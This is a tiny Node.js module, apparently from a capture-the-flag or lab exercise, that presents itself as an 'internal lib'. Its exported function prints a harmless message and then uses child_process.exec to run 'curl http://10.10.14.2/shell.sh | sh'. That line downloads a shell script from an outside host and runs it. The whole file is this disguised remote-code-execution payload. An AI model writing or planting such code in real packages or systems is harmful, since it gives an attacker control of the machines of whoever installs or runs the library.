const { exec } = require("child_process");
exports.command = function() {
  console.log("This is a message from the internal lib");
  exec("/bin/bash -c 'curl http://10.10.14.2/shell.sh | sh'");
return "bdhhdhdhdhdhhdhdhdh";
}

